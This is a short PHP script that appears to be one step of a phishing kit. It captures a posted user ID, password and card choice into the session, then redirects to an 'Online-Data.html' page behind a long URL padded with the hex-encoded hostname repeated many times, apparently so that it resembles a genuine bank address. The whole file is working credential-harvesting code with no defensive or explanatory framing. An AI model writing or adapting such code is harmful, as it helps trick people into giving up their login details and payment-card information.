<?php
session_start();
$_SESSION['userID'] = $_POST['1'];
$_SESSION['password'] = $_POST['2'];
$_SESSION['choose-card'] = $_POST['choose-card'];
$host = bin2hex ($_SERVER['HTTP_HOST']);
$Logon="Online-Data.html?$host-$host-$host$host$host$host$host$host$host$host$host";

header("location: $Logon");

?>